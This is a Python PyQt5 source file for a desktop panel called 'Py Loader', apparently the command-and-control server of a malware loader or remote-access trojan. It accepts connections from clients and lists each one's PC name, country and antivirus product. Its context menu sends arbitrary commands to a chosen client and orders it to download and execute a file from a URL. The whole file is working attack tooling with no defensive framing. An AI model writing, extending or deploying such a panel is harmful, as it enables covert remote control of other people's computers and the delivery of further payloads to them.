import sys
import socket
from threading import Thread
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox, QMenu, QInputDialog, QTableWidgetItem, QDialog, QVBoxLayout, QLabel, QLineEdit, QPushButton
from PyQt5.QtCore import pyqtSignal, pyqtSlot, QObject, Qt
from plyer import notification
import ctypes
import platform
import time
import json

# Notification setup
def show_notification(title, message):
    notification.notify(
        title=title,
        message=message,
        app_name='Server Notifications'
    )

BACKLOG = 50
MAX_CHUNK_SIZE = 16 * 1024
PAYLOAD_SUFFIX = b'\x00\x00\xff\xff'
VERSION = "PyNet 1.0"

class Colours:
    def __init__(self):
        self.colours_fn = {}
        self.colours = []
        if platform.system() == 'Windows':
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)

class Server(QObject, Colours):
    new_connection_signal = pyqtSignal(tuple)
    update_connections_signal = pyqtSignal()

    def __init__(self, connect=("0.0.0.0", 8080), parent=None):
        super(Server, self).__init__(parent)
        Colours.__init__(self)
        self.connections = []
        self.stop = False
        self.connect = connect
        self.sock = self.create_connection(self.connect)
        self.new_connection_signal.connect(parent.update_connections)
        self.update_connections_signal.connect(parent.refresh_connections)
        self.accept_thread = Thread(target=self.accept_connections)
        self.accept_thread.start()
        self.check_connections_thread = Thread(target=self.check_connections)
        self.check_connections_thread.start()

    def create_connection(self, connect):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(connect)
        sock.listen(BACKLOG)
        sock.settimeout(0.5)
        return sock

    def accept_connections(self):
        while not self.stop:
            try:
                conn, address = self.sock.accept()
                conn.setblocking(0)
                connection_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
                pc_name, country, antivirus = self.recv_initial_info(conn)
                self.connections.append((conn, address, connection_time, 'Active', pc_name, country, antivirus))
                self.new_connection_signal.emit((conn, address, connection_time, 'Active', pc_name, country, antivirus))
            except socket.timeout:
                continue
            except BlockingIOError:
                continue
            except Exception as e:
                print(f"Error accepting connections: {e}")

    def recv_initial_info(self, conn):
        data = b''
        while True:
            try:
                part = conn.recv(MAX_CHUNK_SIZE)
                data += part
                if len(part) < MAX_CHUNK_SIZE:
                    break
            except BlockingIOError:
                continue
        data_str = data.decode('utf-8')
        print(f"Received data: {data_str}")  # Debugging statement
        try:
            pc_name, country, antivirus = data_str.split(", ")
            pc_name = pc_name.split(": ")[1]
            country = country.split(": ")[1]
            antivirus = antivirus.split(": ")[1]
            return pc_name, country, antivirus
        except Exception as e:
            print(f"Error parsing initial info: {e}")
            return "Unknown", "Unknown", "Unknown"

    def stop_server(self):
        self.stop = True
        self.sock.close()
        for conn, _ in self.connections:
            conn.close()

    def check_connections(self):
        while not self.stop:
            time.sleep(1)
            self.update_connections_signal.emit()

    def _is_socket_closed(self, sock: socket.socket) -> bool:
        try:
            buf = sock.recv(1, socket.MSG_PEEK)
            if buf == b'':
                return True
        except BlockingIOError:
            return False
        except ConnectionResetError:
            return True
        except Exception:
            return False
        return False

    def is_socket_closed(self, sock: socket.socket) -> bool:
        if self._is_socket_closed(sock):
            self.connections = [c for c in self.connections if c[0] != sock]
            return True
        return False

    def get_connections(self):
        return [(i + 1, conn, address, connection_time, status, pc_name, country, antivirus) for
                i, (conn, address, connection_time, status, pc_name, country, antivirus) in enumerate(self.connections)
                if not self.is_socket_closed(conn)]

class Ui_MainWindow(object):
    def __init__(self):
        self.tableWidget = None

    def setupUi(self, MainWindow):
        MainWindow.setObjectName("PyNet")
        MainWindow.resize(800, 400)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.startButton = QtWidgets.QPushButton(self.centralwidget)
        self.startButton.setGeometry(QtCore.QRect(20, 20, 100, 23))
        self.startButton.setObjectName("startButton")
        self.stopButton = QtWidgets.QPushButton(self.centralwidget)
        self.stopButton.setGeometry(QtCore.QRect(140, 20, 100, 23))
        self.stopButton.setObjectName("stopButton")
        self.tableWidget = QtWidgets.QTableWidget(self.centralwidget)
        self.tableWidget.setGeometry(QtCore.QRect(20, 60, 750, 300))
        self.tableWidget.setObjectName("tableWidget")
        self.tableWidget.setColumnCount(8)
        self.tableWidget.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(0, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(1, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(2, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(3, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(4, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(5, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(6, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(7, item)
        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "Py Loader"))
        self.startButton.setText(_translate("MainWindow", "Start Server"))
        self.stopButton.setText(_translate("MainWindow", "Stop Server"))
        item = self.tableWidget.horizontalHeaderItem(0)
        item.setText(_translate("MainWindow", "ID"))
        item = self.tableWidget.horizontalHeaderItem(1)
        item.setText(_translate("MainWindow", "IP Address"))
        item = self.tableWidget.horizontalHeaderItem(2)
        item.setText(_translate("MainWindow", "Port"))
        item = self.tableWidget.horizontalHeaderItem(3)
        item.setText(_translate("MainWindow", "Connection Time"))
        item = self.tableWidget.horizontalHeaderItem(4)
        item.setText(_translate("MainWindow", "Status"))
        item = self.tableWidget.horizontalHeaderItem(5)
        item.setText(_translate("MainWindow", "PC Name"))
        item = self.tableWidget.horizontalHeaderItem(6)
        item.setText(_translate("MainWindow", "Country"))
        item = self.tableWidget.horizontalHeaderItem(7)
        item.setText(_translate("MainWindow", "Antivirus"))

class SettingsDialog(QDialog):
    def __init__(self, parent=None):
        super(SettingsDialog, self).__init__(parent)
        self.setWindowTitle("Server Settings")
        self.setGeometry(100, 100, 300, 150)
        layout = QVBoxLayout()

        self.ip_label = QLabel("Server IP:")
        self.ip_input = QLineEdit()
        self.port_label = QLabel("Server Port:")
        self.port_input = QLineEdit()

        layout.addWidget(self.ip_label)
        layout.addWidget(self.ip_input)
        layout.addWidget(self.port_label)
        layout.addWidget(self.port_input)

        self.save_button = QPushButton("Save")
        self.save_button.clicked.connect(self.save_settings)

        layout.addWidget(self.save_button)
        self.setLayout(layout)

        self.load_settings()

    def load_settings(self):
        try:
            with open("settings.json", "r") as f:
                settings = json.load(f)
                self.ip_input.setText(settings.get("server_ip", "0.0.0.0"))
                self.port_input.setText(settings.get("server_port", "8080"))
        except FileNotFoundError:
            pass

    def save_settings(self):
        settings = {
            "server_ip": self.ip_input.text(),
            "server_port": self.port_input.text()
        }
        with open("settings.json", "w") as f:
            json.dump(settings, f)
        self.accept()

class MainWindow(QMainWindow):
    def __init__(self):
        super(MainWindow, self).__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.server = None
        self.initUI()

    def initUI(self):
        self.ui.startButton.clicked.connect(self.start_server)
        self.ui.stopButton.clicked.connect(self.stop_server)
        self.ui.tableWidget.setContextMenuPolicy(Qt.CustomContextMenu)
        self.ui.tableWidget.customContextMenuRequested.connect(self.context_menu)
        self.settings_dialog = SettingsDialog(self)
        self.settings_dialog.exec_()

    @pyqtSlot(tuple)
    def update_connections(self, connection_info):
        conn, address, connection_time, status, pc_name, country, antivirus = connection_info
        row_position = self.ui.tableWidget.rowCount()
        self.ui.tableWidget.insertRow(row_position)
        self.ui.tableWidget.setItem(row_position, 0, QTableWidgetItem(str(row_position + 1)))
        self.ui.tableWidget.setItem(row_position, 1, QTableWidgetItem(address[0]))
        self.ui.tableWidget.setItem(row_position, 2, QTableWidgetItem(str(address[1])))
        self.ui.tableWidget.setItem(row_position, 3, QTableWidgetItem(connection_time))
        self.ui.tableWidget.setItem(row_position, 4, QTableWidgetItem(status))
        self.ui.tableWidget.setItem(row_position, 5, QTableWidgetItem(pc_name))
        self.ui.tableWidget.setItem(row_position, 6, QTableWidgetItem(country))
        self.ui.tableWidget.setItem(row_position, 7, QTableWidgetItem(antivirus))
        show_notification("New Connection", f"New connection from {address[0]}:{address[1]}")

    @pyqtSlot()
    def refresh_connections(self):
        self.ui.tableWidget.setRowCount(0)
        for i, conn, address, connection_time, status, pc_name, country, antivirus in self.server.get_connections():
            row_position = self.ui.tableWidget.rowCount()
            self.ui.tableWidget.insertRow(row_position)
            self.ui.tableWidget.setItem(row_position, 0, QTableWidgetItem(str(i)))
            self.ui.tableWidget.setItem(row_position, 1, QTableWidgetItem(address[0]))
            self.ui.tableWidget.setItem(row_position, 2, QTableWidgetItem(str(address[1])))
            self.ui.tableWidget.setItem(row_position, 3, QTableWidgetItem(connection_time))
            self.ui.tableWidget.setItem(row_position, 4, QTableWidgetItem(status))
            self.ui.tableWidget.setItem(row_position, 5, QTableWidgetItem(pc_name))
            self.ui.tableWidget.setItem(row_position, 6, QTableWidgetItem(country))
            self.ui.tableWidget.setItem(row_position, 7, QTableWidgetItem(antivirus))

    def start_server(self):
        if self.server is None:
            with open("settings.json", "r") as f:
                settings = json.load(f)
                server_ip = settings.get("server_ip", "0.0.0.0")
                server_port = int(settings.get("server_port", 8080))
            self.server = Server(connect=(server_ip, server_port), parent=self)
            QMessageBox.information(self, "Server", f"Server started on {server_ip}:{server_port}.")
        else:
            QMessageBox.warning(self, "Server", "Server is already running.")

    def stop_server(self):
        if self.server is not None:
            self.server.stop_server()
            self.server = None
            QMessageBox.information(self, "Server", "Server stopped.")
        else:
            QMessageBox.warning(self, "Server", "Server is not running.")

    def context_menu(self, pos):
        menu = QMenu()
        selected = self.ui.tableWidget.itemAt(pos)
        if selected is not None:
            row = selected.row()
            conn_id = self.ui.tableWidget.item(row, 0).text()
            conn_ip = self.ui.tableWidget.item(row, 1).text()
            conn_port = self.ui.tableWidget.item(row, 2).text()

            menu.addAction(f"Send Command to {conn_ip}:{conn_port}", lambda: self.send_command(int(conn_id)))
            menu.addAction(f"Disconnect {conn_ip}:{conn_port}", lambda: self.disconnect_client(int(conn_id)))
            menu.addAction(f"Download and Execute on {conn_ip}:{conn_port}", lambda: self.download_and_execute(int(conn_id)))

        menu.exec_(self.ui.tableWidget.viewport().mapToGlobal(pos))

    def send_command(self, conn_id):
        command, ok = QInputDialog.getText(self, "Send Command", f"Enter command for client {conn_id}:")
        if ok and self.server:
            for i, conn, address, connection_time, status, pc_name, country, antivirus in self.server.get_connections():
                if i == conn_id:
                    try:
                        print(f"Sending command to {conn_id}: {command}")  # Debugging statement
                        conn.sendall(command.encode() + PAYLOAD_SUFFIX)
                    except Exception as e:
                        print(f"Error sending command to {conn_id}: {e}")
                        conn.close()
                        self.server.connections = [c for c in self.server.connections if c[0] != conn]
                        self.refresh_connections()
                    break

    def disconnect_client(self, conn_id):
        if self.server:
            for i, conn, address, connection_time, status, pc_name, country, antivirus in self.server.get_connections():
                if i == conn_id:
                    conn.close()
                    self.server.connections = [c for c in self.server.connections if c[0] != conn]
                    self.refresh_connections()
                    break

    def download_and_execute(self, conn_id):
        file_url, ok = QInputDialog.getText(self, "Download and Execute", f"Enter URL of the file to download and execute on client {conn_id}:")
        if ok and self.server:
            for i, conn, address, connection_time, status, pc_name, country, antivirus in self.server.get_connections():
                if i == conn_id:
                    try:
                        print(f"Sending download and execute command to {conn_id}: {file_url}")  # Debugging statement
                        conn.sendall(f"DOWNLOAD_EXECUTE {file_url}".encode() + PAYLOAD_SUFFIX)
                    except Exception as e:
                        print(f"Error sending download and execute command to {conn_id}: {e}")
                        conn.close()
                        self.server.connections = [c for c in self.server.connections if c[0] != conn]
                        self.refresh_connections()
                    break

if __name__ == '__main__':
    app = QApplication(sys.argv)
    main_win = MainWindow()
    main_win.show()
    sys.exit(app.exec_())

